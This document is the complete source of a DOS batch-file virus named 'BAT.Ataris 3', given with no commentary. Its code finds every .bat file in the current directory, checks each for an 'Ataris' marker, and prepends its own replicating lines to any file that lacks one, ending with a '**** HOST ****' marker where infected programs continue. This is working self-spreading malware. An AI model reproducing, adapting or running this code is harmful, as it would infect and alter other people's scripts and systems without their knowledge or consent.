::Ataris BAT.Ataris 3
@echo off%_Ataris%
if '%1=='Ataris goto Ataris%2
set Ataris=%0.bat
if not exist %Ataris% set Ataris=%0
if '%Ataris%==' set Ataris=autoexec.bat
if not exist %Ataris% goto eAtaris
command /c %Ataris% Ataris vir
:eAtaris
set Ataris=
if exist \!Ataris.bat del \!Ataris.bat
goto Atarisend
:Atarisxt
echo.>\!Ataris.bat
\!Ataris.bat
:Atarisvir
for %%a in (*.bat) do call %Ataris% Ataris i %%a
exit Ataris
:Atarisi
find "Ataris"<%3>nul
if not errorlevel 1 goto Atarisxt
find "Ataris"<%Ataris%>Ataris$
type %3>>Ataris$
move Ataris$ %3>nul
goto Atarisxt
:Atarisend
::**** HOST ****
